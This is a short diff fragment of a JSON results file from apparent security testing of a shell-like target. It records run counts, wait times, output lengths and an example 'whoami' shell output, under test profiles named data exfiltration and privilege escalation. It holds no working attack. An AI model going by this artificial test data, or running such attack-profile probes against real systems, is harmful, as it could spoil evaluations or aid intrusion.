+    "n": 3,
+    "prompt_returned": 3,
+    "recorded": 3,
+    "wait_s": [
+      0.047,
+      0.047,
+      0.063
+    ],
+    "output_chars": [
+      26,
+      26,
+      30
+    ],
+    "profiles": [
+      "data_exfiltration",
+      "privilege_escalation"
+    ],
+    "example_output": "whoami\nuser\nuser@svr04:~$ ",
+    "median_output_chars": 26,
+    "max_wait_s": 0.063
+  }
+}
